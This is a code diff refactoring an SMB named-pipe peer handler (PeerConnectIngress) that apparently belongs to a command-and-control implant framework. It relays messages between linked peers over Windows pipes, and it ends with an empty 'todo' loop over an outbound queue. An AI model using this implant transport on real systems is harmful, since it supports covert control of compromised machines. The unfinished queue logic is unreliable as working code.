@@ -396,47 +396,54 @@ namespace Smb {
 
     VOID PeerConnectIngress (_stream *out, _stream **in) {
         HEXANE
-        // when we are the parent, a new smb peer will be added to our list of peers
-        // we handle the ingress pipe state
 
         SECURITY_ATTRIBUTES sec_attr    = { };
         SMB_PIPE_SEC_ATTR smb_attr      = { };
 
-        auto head = Ctx->peers;
-        while (head) {
+        auto peer = Ctx->peers;
+        auto head = Ctx->transport.outbound_queue;
 
-            _stream stream = { };
-            uint32_t offset = 0;
-
-            if (head->ingress_name) {
-                if (!head->ingress_handle) {
+        while (peer) {
+            if (peer->ingress_name) {
+                if (!peer->ingress_handle) {
 
                     SmbContextInit(&smb_attr, &sec_attr);
-                    if (!(head->ingress_handle = Ctx->win32.CreateNamedPipeW(head->ingress_name, PIPE_ACCESS_DUPLEX, PIPE_TYPE_MESSAGE | PIPE_READMODE_MESSAGE | PIPE_WAIT, PIPE_UNLIMITED_INSTANCES, PIPE_BUFFER_MAX, PIPE_BUFFER_MAX, 0, &sec_attr))) {
+                    if (!(peer->ingress_handle = Ctx->win32.CreateNamedPipeW(peer->ingress_name, PIPE_ACCESS_DUPLEX, PIPE_TYPE_MESSAGE | PIPE_READMODE_MESSAGE | PIPE_WAIT, PIPE_UNLIMITED_INSTANCES, PIPE_BUFFER_MAX, PIPE_BUFFER_MAX, 0, &sec_attr))) {
                         return_defer(ntstatus);
                     }
 
                     SmbContextDestroy(&smb_attr);
-                    if (!Ctx->win32.ConnectNamedPipe(head->ingress_handle, nullptr)) {
+                    if (!Ctx->win32.ConnectNamedPipe(peer->ingress_handle, nullptr)) {
                         return_defer(ntstatus);
                     }
                 }
-            }
 
-            if (head->ingress_handle) {
-                while (PeekClientMessage(head->ingress_handle, stream, offset)) {
-                    SetFilePointer(head->ingress_handle, offset, NULL, FILE_BEGIN);
+                _stream stream = { };
+                uint32_t offset = 0;
 
-                    if (!ProcessClientMessage(head->ingress_handle, stream)) {
+                while (PeekClientMessage(peer->ingress_handle, stream, offset)) {
+                    SetFilePointer(peer->ingress_handle, offset, NULL, FILE_BEGIN);
+
+                    if (!ProcessClientMessage(peer->ingress_handle, stream)) {
                         return_defer(ntstatus);
                     }
                 }
+
+                Ctx->win32.SleepEx(500, FALSE);
+                SetFilePointer(peer->ingress_handle, 0, NULL, FILE_BEGIN);
+
+                while (head) {
+                    if (head->peer_id == peer->peer_id) {
+                        // todo: search outbound_queue and find messages for peers
+
+                    }
+
+                    head = head->next;
+                }
+
+                peer = peer->next;
+                head = Ctx->transport.outbound_queue;
             }
-
-            Ctx->win32.SleepEx(500, FALSE);
-            SetFilePointer(head->ingress_handle, 0, NULL, FILE_BEGIN);
-
-            head = head->next;
         }
 
         defer:
